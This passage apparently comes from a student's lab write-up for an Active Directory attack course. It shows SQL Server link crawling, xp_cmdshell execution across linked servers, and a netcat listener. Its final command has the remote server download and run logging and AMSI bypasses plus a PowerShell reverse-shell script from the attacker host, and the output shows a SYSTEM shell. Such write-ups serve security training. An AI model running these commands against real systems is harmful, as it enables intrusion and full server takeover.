VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MGMT🖥️
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT
VERBOSE:  - Link Login: sqluser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: EU-SQL26.EU.EUROCORP.LOCAL
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: EU-SQL26🖥️
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT -> EU-SQL26.EU.EUROCORP.LOCAL🔗
VERBOSE:  - Link Login: sa
VERBOSE:  - Link IsSysAdmin: 1
VERBOSE:  - Link Count: 0
VERBOSE:  - Links on this server:


Version     : SQL Server 2019
Instance    : DCORP-MSSQL🖥️
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student422👤
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL26.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL26🖥️
CustomQuery :
Sysadmin    : 1📌
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL26.EU.EUROCORP.LOCAL}
User        : sa👤
Links       :
```

- **Check if we can Execute Commands on a Linked Database**

`Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"`:
```
Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student422
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL26.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL26🗄️
CustomQuery : {USERNAME=SYSTEM, }📌
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL26.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

- **Obtain a Reverse Shell executing a PowerShell Script on the Target Linked Database**
  
![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`:
```
listening on [any] 443 ...

[...]
```

![Invoke-PowerShellTcpEx.ps1](./assets/screenshots/learning_objective_22_invokepowershelltcpex.png)

![HFS - Scripts](./assets/screenshots/learning_objective_22_hfs_scripts.png)

`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.22/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.22/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.22/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql26`

```
[...]

172.16.15.17: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [172.16.100.22] from (UNKNOWN) [172.16.15.17] 61960: NO_DATA
Windows PowerShell running as user SYSTEM on EU-SQL26
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```
🚀

![eu-sql26 | system](https://custom-icon-badges.demolab.com/badge/eu--sql26-system-64b5f6?logo=windows11&logoColor=white)

`$env:username`:
```
SYSTEM👤
```

`$env:computername`:
```
EU-SQL26🖥️
```
🚩

---
---
